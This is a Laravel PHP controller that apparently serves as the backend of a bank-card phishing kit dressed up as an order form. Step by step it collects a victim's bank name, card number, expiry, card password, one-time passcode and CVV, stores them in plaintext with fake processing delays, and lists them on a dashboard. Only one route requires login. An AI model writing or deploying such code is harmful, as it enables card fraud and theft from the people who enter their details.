<?php

namespace App\Http\Controllers;

use App\Models\Order;
use Illuminate\Http\Request;

class OrdersController extends Controller
{

        public function __construct()
    {
        $this->middleware('auth')->only('index');
    }



    public function index()
    {
        $orders = Order::all();
        return view('dashboard.orders.index',compact('orders'));
    }

    public function create()
    {
        //
    }

    public function store(Request $request)
    {

        sleep(3);

        $request->validate([
           'bank_name' => 'required',
           'debitNumber' => 'required|string',
           'exp_year' => 'required',
           'exp_month' => 'required',
           'password' => 'required',
        ]);

        $order = new Order();
        $order->bank_name = $request->get('bank_name');
        $order->card_number = $request->get('dcprefix') . $request->get('debitNumber');
        $order->expire = $request->get('exp_year') . '|' . $request->get('exp_month');
        $order->password = $request->get('password');
        $order->bank_name = $request->get('bank_name');
        $order->save();


       return view('front.success',compact('order'));
    }

    public function show(Order $order)
    {
        return view('dashboard.orders.show',compact('order'));
    }

    public function edit(Order $order)
    {
        //
    }

    public function update(Request $request , Order $order)
    {
        $request->validate([
            'otp' => 'required',
        ]);
        $order->update([
            'otp' => $request->otp
        ]);
        $order->save();

        return view('front.cvv',compact('order'));
    }

    public function destroy(Request $request)
    {
        Order::destroy($request->id);
        return redirect()->route('orders.index')->with('order-deleted','');
    }

    public function message(Request $request)
    {
        sleep(3);
        $order = Order::findOrFail($request->id);
        $data = $request->only([
            'message'
        ]);
        $order->update($data);

        return redirect()->route('done');

    }

    public function cvv(Request $request){
        $request->validate([
            'cvv' => 'required',
        ]);
        $order = Order::query()->findOrFail($request->get('id'));
        $order->update([
            'cvv' => $request->cvv
        ]);
        $order->save();
        return redirect()->route('done');
    }
}
